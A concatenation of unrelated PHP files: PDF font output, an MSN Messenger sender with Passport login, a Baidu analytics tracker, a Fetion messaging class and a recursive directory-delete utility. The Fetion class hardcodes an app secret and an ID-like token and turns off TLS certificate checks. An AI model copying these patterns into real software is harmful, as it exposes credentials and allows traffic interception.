	$this->_out('/BaseFont /'.$font['name'].'-'.$font['CMap']);
	$this->_out('/Encoding /'.$font['CMap']);
	$this->_out('/DescendantFonts ['.($this->n+1).' 0 R]');
	$this->_out('>>');
	$this->_out('endobj');
	// CIDFont
	$this->_newobj();
	$this->_out('<</Type /Font');
	$this->_out('/Subtype /CIDFontType0');
	$this->_out('/BaseFont /'.$font['name']);
	$this->_out('/CIDSystemInfo <</Registry '.$this->_textstring('Adobe').' /Ordering '.$this->_textstring($font['registry']['ordering']).' /Supplement '.$font['registry']['supplement'].'>>');
	$this->_out('/FontDescriptor '.($this->n+1).' 0 R');
	if($font['CMap']=='ETen-B5-H')
		$W = '13648 13742 500';
	elseif($font['CMap']=='GBK-EUC-H')
		$W = '814 907 500 7716 [500]';
	else
		$W = '1 ['.implode(' ',$font['cw']).']';
	$this->_out('/W ['.$W.']>>');
	$this->_out('endobj');
	// Font descriptor
	$this->_newobj();
	$this->_out('<</Type /FontDescriptor');
	$this->_out('/FontName /'.$font['name']);
	$this->_out('/Flags 6');
	$this->_out('/FontBBox [0 -200 1000 900]');
	$this->_out('/ItalicAngle 0');
	$this->_out('/Ascent 800');
	$this->_out('/Descent -200');
	$this->_out('/CapHeight 800');
	$this->_out('/StemV 50');
	$this->_out('>>');
	$this->_out('endobj');
}
}
?>

<?php 

//require_once('msnpauth.php');

define('ERR_AUTHENTICATION_FAILED', 911);
define('ERR_SERVER_UNAVAILABLE', 600);
define('ERR_USER_OFFLINE', 217);
define('ERR_TOO_MANY_SESSIONS', 800);
define('OK', 1);

class sendMsg
{
	var $_passport;
	var $_password;
	var $_account;
	var $_sockets;
	var $_msg;
	var $result;
	var $error;

	function simpleSend($passport, $password, $recipient, $message)
	{
		$this->login($passport, $password);

		if ($this->result > 1)
		{
			return;
		}

		$this->createSession($recipient);
		$this->sendMessage($message);
	}

	function login($passport, $password)
	{
		$this->_passport = $passport;
		$this->_password = $password;

		$this->_connect('NS');

		$this->_send_data('NS', 'VER 0 MSNP8');

		$this->_read();
	}

	function createSession($account)
	{
		// Stop if login failed.
		if ($this->result > 1)
		{
			return;
		}

		$this->_account = $account;

		$this->_send_data('NS', 'XFR 5 SB');

		$this->_read();
	}

	function sendMessage($message, $font = NULL, $color = NULL)
	{
		// Stop if login failed.
		if ($this->result > 1)
		{
			return;
		}

		$head = "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n";

		if (isset($font))
		{
			$font = rawurlencode($font);

			$head .= "X-MMS-IM-Format: FN=$font; EF=; CO=$color; CS=0; PF=22\r\n";
		}

		$head .= "\r\n";

		$len = strlen($head.$message);

		$this->_send_data('SB', "MSG 3 U $len\r\n$head$message");

		$this->result = OK;
	}

	function _connect($socket, $server = 'messenger.hotmail.com')
	{
		// This part does a DNS lookup on the server, and fails with error if it is not found.
		// fsockopen doesn't return an error on DNS lookup failures, instead it outputs a warning (which we want to suppress).
		if ((gethostbyname($server) == $server) && !is_numeric(str_replace('.', '', $server)))
		{
			$this->result = ERR_SERVER_UNAVAILABLE;
			$this->error = 'Host not found'.$server;

			return false;
		}

		ini_set('default_socket_timeout', 2);

		$this->_sockets[$socket] = @fsockopen($server, 1863, $errno, $errstr, 2);

		if ($this->_sockets[$socket] == false)
		{
			$this->result = $errno;
			$this->error = $errstr;

			return false;
		}

		return true;
	}

	function _read($socket = 'NS')
	{
		$r = false;

		while ($this->_sockets[$socket] && !feof($this->_sockets[$socket]) && !$r)
		{
			$data = fgets($this->_sockets[$socket], 1024);

			if (!$data)
			{
				continue;
			}

			$data = substr($data, 0, -2);

			$r = $this->_process_data($data);

			if ($r)
			{
				return;
			}
		}
	}

	function _send_data($socket, $data)
	{
		if (substr($data, 0, 3) == 'MSG')
		{
			// Don't send appending new line if it's a payload command. (MSG)
			fputs($this->_sockets[$socket], $data);
		}
		else
		{
			fputs($this->_sockets[$socket], "$data\r\n");
		}
	}

	function _process_data($data)
	{
		$params = explode(' ', $data);

		switch ($params[0])
		{
			case 'VER':
				$this->_send_data('NS', 'CVR 1 0x0409 winnt 5.1 i386 MSNMSGR 6.0.0254 MSMSGS '.$this->_passport);

				break;

			case 'CVR':
				$this->_send_data('NS', 'USR 2 TWN I '.$this->_passport);

				break;

			case 'XFR':
				$subParams = explode(':', $params[3]);

				$r = $this->_connect($params[2], $subParams[0]);

				if (!$r)
				{
					return true;
				}

				if ($params[2] == 'NS')
				{
					$this->_send_data('NS', 'VER 0 MSNP8');
				
				}
				elseif ($params[2] == 'SB')
				{
					$this->_send_data('SB', 'USR 1 '.$this->_passport.' '.$params[5]);
				}

				$this->_read($params[2]);

				return true;

				break;

			case 'USR':
				if ($params[2] == 'TWN')
				{
					$msnpauth = new MSNPAuth($this->_passport, $this->_password, $params[4]);
					$hash = $msnpauth->getKey();

					if (!$hash)
					{
						$this->result = ERR_AUTHENTICATION_FAILED;
						$this->_send_data('NS', 'OUT');

						return false;
					}

					$this->_send_data('NS', 'USR 3 TWN S '.$hash);

				}
				elseif ($params[2] == 'OK')
				{
					if (count($params) == 7)
					{
						$this->_send_data('NS', 'CHG 4 NLN');

						return true;

					}
					else
					{
						$this->_send_data('SB', 'CAL 0 '.$this->_account);
					}
				}

				break;

			case 'JOI':
				return true;

				break;

			// Error code handling

			case '500':
			case '600':
			case '601':
			case '910':
			case '911':
			case '921':
			case '928':
				$this->result = ERR_SERVER_UNAVAILABLE;

				return true;

				break;

			case  '800':
				$this->result = ERR_TOO_MANY_SESSIONS;

				return true;

				break;

			case '217':
				$this->result = ERR_USER_OFFLINE;

				return true;

				break;
		}

		return false;
	}
}

?>
<?php 

//-----------------------------------------
// msnpauth.php, v1.2.1
// by Daniel Winter
// http://www.msnfanatic.com/
// 
// Copyright ?2003-2005 Daniel Winter
// 
// http://www.danielwinter.info/contact.php or mailto:daniel@msnfanatic.com
// 
// Last reviewed: October 1st, 2005
// 
//-----------------------------------------
//
// Usage: 
// 
// 	$msnpauth = new MSNPAuth($passport, $password, $params[4]);
// 	$hash = $msnpauth->getKey();
// 
// $passport would be the e-mail address that is being signed in
// $password would be the password for that account
// $params[4] would be the string sent in the USR command from the notification server,
// 
// With the last argument, the notification server communication goes like this:
// 
// 	[SEND] USR 6 TWN I bob@hotmail.com\r\n
// 	[RECV] USR 6 TWN S lc=1033,id=507,tw=40,fs=1,ru=http%3A%2F%2Fmessenger%2Emsn%2Ecom,ct=1128154104,kpp=1,kv=7,ver=2.1.6000.1,rn=C6D!I5Ic,tpf=41a9cb6f69e60faa44c8570126f045ed\r\n
// 
// You use 4th argument (starting from 0) from the response (ie. lc=1033,id=507,tw=40...)
// Make sure you are actually sending the right string, if you were to split the response into an array, it should look like this:
//
// 	Array
// 	(
// 		[0] => USR
// 		[1] => 2
// 		[2] => TWN
// 		[3] => S
// 		[4] => lc=1033,id=507,tw=40,fs=1,ru=http%3A%2F%2Fmessenger%2Emsn%2Ecom,ct=1128154104,kpp=1,kv=7,ver=2.1.6000.1,rn=C6D!I5Ic,tpf=41a9cb6f69e60faa44c8570126f045ed
// 	)
//
//-----------------------------------------

class MSNPAuth
{
	var $_key;

	function MSNPAuth($passport, $password, $challenge)
	{
		$i = strpos($passport, "@");

		switch (substr($passport, $i))
		{
			case "@hotmail.com":
				$authURL = "ssl://loginnet.passport.com";
				break;

			case "@msn.com":
				$authURL = "ssl://msnialogin.passport.com";
				break;

			default:
				$authURL = "ssl://login.passport.com";
				break;
		}

		$fp = fsockopen($authURL, 443);

		$req = array();
		$data = '';

		$req[] = 'GET /login2.srf HTTP/1.1';
		$req[] = 'Authorization: Passport1.4 OrgVerb=GET,OrgURL=http%3A%2F%2Fmessenger%2Emsn%2Ecom, sign-in='.str_replace('@', '%40', $passport).',pwd='.urlencode($password).','.$challenge;
		$req[] = 'Host: login.passport.com';
		$req[] = 'Connection: Close';

		foreach ($req as $v)
		{
			fputs($fp, "$v\r\n");
		}

		fputs($fp, "\r\n");

		//-----------------------------------------
		// fgets() is error suppressed to work around this bug: http://bugs.php.net/bug.php?id=23220 
		// 
		// During development, I always got the following: 
		//  - Warning: fgets(): SSL: fatal protocol error in /home/fanatics/public_html/x/class/MSNPAuth.class.php on line 53
		//-----------------------------------------

		while (!feof($fp))
		{
			$data .= @fgets($fp);
		}

		fclose($fp);

		$headers = explode("\r\n", $data);

		foreach ($headers as $header)
		{
			if (strpos($header, ':') === false)
			{
				continue;
			}

			list($name, $value) = explode(':', $header);

			switch ($name)
			{
				case 'WWW-Authenticate':
					// Authentication failed
					$this->_key = false;

					break;

				case 'Authentication-Info':
					// Get the key between the two single quotes
					$start = (strpos($value, "'") + 1);
					$end = (strrpos($value, "'") - $start);

					$this->_key = substr($value, $start, $end);

					break;
			}
		}
	}

	function getKey()
	{
		return $this->_key;
	}
}

?>

<?php 

class _HMT {
    private $VERSION = "wap-0-0.2";

    private $VISIT_DURATION = 1800;

    private $VISITOR_MAX_AGE = 31536000;

    private $SEARCH_ENGINE_LIST = array(
        array("1", "baidu.com", "word|wd"), 
        array("2", "google.com", "q"), 
        array("4", "sogou.com", "query"), 
        array("6", "search.yahoo.com", "p"), 
        array("7", "yahoo.cn", "q"), 
        array("8", "soso.com", "w"), 
        array("11", "youdao.com", "q"), 
        array("12", "gougou.com", "search"), 
        array("13", "bing.com", "q"),
        array("14", "so.com", "q"), 
        array("14", "so.360.cn", "q"), 
        array("15", "jike.com", "q"), 
        array("16", "qihoo.com", "kw"), 
        array("17", "etao.com", "q"), 
        array("18", "soku.com", "keyword")
    );

    private $siteId = "";
    private $searchEngine = "";
    private $searchWord = "";

    private $visitUrl = "";
    private $eventType = 0;
    private $eventProperty = "";

    private function getQueryValue($url, $key) {
        preg_match("/(^|&|\\?|#)(" . $key . ")=([^&#]*)(&|$|#)/", $url, $matches);
        return count($matches) > 0 ? $matches[3] : NULL;
    }

    private function getSourceType($path, $referer, $currentPageVisitTime, $lastPageVisitTime) {
        $parsedPath = parse_url($path);
        $parsedReferer = parse_url($referer);
        if (is_null($referer) || (!is_null($parsedPath) && !is_null($parsedReferer) && $parsedPath["host"] === $parsedReferer["host"])) {
            return ($currentPageVisitTime - $lastPageVisitTime > $this->VISIT_DURATION) ? 1 : 4;
        } else {
            $sel = $this->SEARCH_ENGINE_LIST;
            for ($i = 0, $l = count($sel); $i < $l; $i++) {
                if (preg_match("/" . $sel[$i][1] . "/", $parsedReferer["host"])) {
                    $this->searchWord = $this->getQueryValue($referer, $sel[$i][2]);
                    if (!is_null($this->searchWord) || $sel[$i][0] === "2" || $sel[$i][0] === "14" || $sel[$i][0] === "17") {
                        $this->searchEngine = $sel[$i][0];
                        return 2;
                    }
                }
            }
            return 3;
        } 
    }

    private function replaceSpecialChars($text) {
        $text = str_replace("'", "'0", $text);
        $text = str_replace("*", "'1", $text);
        $text = str_replace("!", "'2", $text);
        return str_replace("%27", "'", urlencode($text));
    }

    private function getPixelUrl() {
        $path = (isset($_SERVER["HTTPS"]) && ($_SERVER["HTTPS"] === "on") ? 'https://' : 'http://') .
            $_SERVER['SERVER_NAME'] .
            (($_SERVER["SERVER_PORT"] === '80') ? '' : ':' . $_SERVER["SERVER_PORT"]) .
            $_SERVER['REQUEST_URI'];

        $referer = $_SERVER['HTTP_REFERER'];

        $currentPageVisitTime = time();

        $lastPageVisitTime = (int)$_COOKIE["Hm_lpvt_" . $this->siteId];

        $lastVisitTime = $_COOKIE["Hm_lvt_" . $this->siteId];

        $sourceType = $this->getSourceType($path, $referer, $currentPageVisitTime, $lastPageVisitTime);
        $isNewVisit = ($sourceType == 4) ? 0 : 1;

        setCookie("Hm_lpvt_" . $this->siteId, $currentPageVisitTime, 0, "/");
        setCookie("Hm_lvt_" . $this->siteId, $currentPageVisitTime, time() + $this->VISITOR_MAX_AGE, "/");

        $pixelUrl = "http://hm.baidu.com/hm.gif" .
            "?si=" . $this->siteId .
            "&et=" . $this->eventType .
            ($this->eventProperty !== "" ? "&ep=" . $this->eventProperty : "") .
            "&nv=" . $isNewVisit .
            "&st=" . $sourceType .
            ($this->searchEngine !== "" ? "&se=" . $this->searchEngine : "") .
            ($this->searchWord !== "" ? "&sw=" . urlencode($this->searchWord) : "") .
            (!is_null($lastVisitTime) ? "&lt=" . $lastVisitTime : "") .
            (!is_null($referer) ? "&su=" . urlencode($referer) : "") .
            ($this->visitUrl !== "" ? "&u=" . urlencode($this->visitUrl) : "") .
            "&v=" . $this->VERSION .
            "&rnd=" . rand(10e8, 10e9);

        return htmlspecialchars($pixelUrl);
    }

    public function __construct($siteId) {
        $this->siteId = $siteId;
    }

    public function setAccount($siteId) {
        $this->siteId = $siteId;
    }

    public function trackPageView($url = NULL) {
        $this->eventType = 0;
        $this->eventProperty = "";
        if (!is_null($url) && strpos($url, "/") === 0) {
            $this->visitUrl = (isset($_SERVER["HTTPS"]) && ($_SERVER["HTTPS"] === "on") ? 'https://' : 'http://') .
                $_SERVER['SERVER_NAME'] .
                (($_SERVER["SERVER_PORT"] === '80') ? '' : ':' . $_SERVER["SERVER_PORT"]) .
                $url;
        } else {
            $this->visitUrl = "";
        }
        return $this->getPixelUrl();
    }

    public function trackEvent($category, $action, $opt_label = NULL, $opt_value = NULL) {
        $this->eventType = 4;
        $this->eventProperty = $this->replaceSpecialChars($category) .
            "*" . $this->replaceSpecialChars($action) .
            (!is_null($opt_label) ? "*" . $this->replaceSpecialChars($opt_label) : "" ) .
            (!is_null($opt_value) ? "*" . $this->replaceSpecialChars($opt_value) : "" );
        $this->visitUrl = "";
        return $this->getPixelUrl();
    }
}

?>
<?php 
/**
 * PHP飞信发送类
 *
 * @author quanhengzhuang <blog.quanhz.com>
 * @version 1.5.0
 */
class fetion_class{
	
	var $appid = '11256';
	var $secret = '6c323e8b6b1cf76917d920570cfcbfc1';
	var $token = '510212198004250318';
	var $gz = '4021000783';
	var $openid = '637497536';
	
	function getaccesstoken(){
          $url = 'http://221.176.30.209/op/open3/index.php/token/?grant_type=client_credential&appid='.encodeuri($this->appid).'&secret='.encodeuri($this->secret);
          $postdata = '';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);           
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray.$url.getcharset());   
          curl_close($ch);		
          return $jsonarray;
	}
	
	function getuseropenid($access_token,$next_openid){
          $url = 'http://221.176.30.209/op/open3/index.php/user/get/?access_token='.encodeuri($access_token).'&next_openid='.encodeuri($next_openid);
          $postdata = '';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);           
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray.$url.getcharset());   
          curl_close($ch);		
          return $jsonarray;
	}	
	
	function sendtextmsg($access_token,$openid,$content){
          $url = 'http://221.176.30.209/op/open3/index.php/customer/send/?access_token='.encodeuri($access_token);
          $postdata = '{"touser":"'.$openid.'","msgtype":"text","text":{"content":"'.$content.'"}}';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);           
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray.$url.getcharset());   
          curl_close($ch);		
          return $jsonarray;
	}	

	function sendmsg($user,$content){
		$getaccesstoken=$this->getaccesstoken();
		//$getuseropenid=$this->getuseropenid($getaccesstoken['access_token']);
		if($user==''){//$getuseropenid['data']['openid'][0]
			$sendtextmsg=$this->sendtextmsg($getaccesstoken['access_token'],$this->openid,$content);
		}
		//print_r($sendtextmsg);		
 	}
}

?>

<?php 
//循环删除目录和文件函数
function delDirAndFile($dirName,$self,$son)
{
if ( $handle = opendir($dirName)) {
   while (false !== ($item = readdir($handle))) {
   	if ($item != "." && $item != ".." ) {
   		if (is_dir($dirName."/".$item)) {
   			delDirAndFile($dirName."/".$item,$son,$son);
   		} 
   		else {
   			if(unlink($dirName."/".$item)){
					//echo "成功删除文件： $dirName/$item<br />\n";
					//return true;
   			}
   		}
   	}
   }
   closedir($handle);
   if($self == '1'){
   	if(rmdir($dirName)){
   		//echo "成功删除目录： $dirName<br />\n";
   		//return true;
   	}
   }
}
}

function getDirSize($dir)
    { 
        $handle = opendir($dir);
        while (false!==($FolderOrFile = readdir($handle)))
        { 
            if($FolderOrFile != "." && $FolderOrFile != "..") 
            { 
                if(is_dir("$dir/$FolderOrFile"))
                { 
                    $sizeResult += getDirSize("$dir/$FolderOrFile"); 
                }
                else
                { 
                    $sizeResult += filesize("$dir/$FolderOrFile"); 
                }
            }    
        }
        closedir($handle);
        return $sizeResult;
    }

?>

<?php 
// 1：生成并输出到浏览器的带JS/VBS的HTML格式文件，在保存到本地后无法正常运行JS/VBS，比如wshell等；用记事本打开并另存后，另存的HTML文件又可以正常运行了(无法直接保存，直接运行)。
// 2：超长连接无法跳转或前往。
// 3：带点域名未URL编码的,形成空连接。
?>

<?php 
// 程序简历：工程名：X3193；生日：4月14日；主要功能及来源：见页首。版权约束：2007-2009
// 主要升级记录：
// 
?>
